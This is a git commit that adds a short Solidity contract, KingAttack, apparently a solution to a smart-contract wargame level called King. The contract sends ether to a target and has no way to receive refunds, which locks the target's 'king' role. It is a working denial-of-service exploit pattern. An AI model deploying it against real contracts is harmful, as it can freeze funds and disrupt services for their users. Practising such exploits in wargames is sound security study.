df0d858a7d05039d193d98f30de6e0f7a8f4eaa1
beaverx00 <beaverx00@gmail.com>
2023-04-07 18:09:43 +0900

    add King test

---
+++ src/attacks/KingAttack.sol
@@ -0,0 +1,15 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract KingAttack {
+    address public target;
+
+    constructor(address _target) {
+        target = _target;
+    }
+
+    function pwn() external payable {
+        (bool sent, ) = payable(target).call{value: msg.value}("");
+        require(sent, "call failed");
+    }
+}
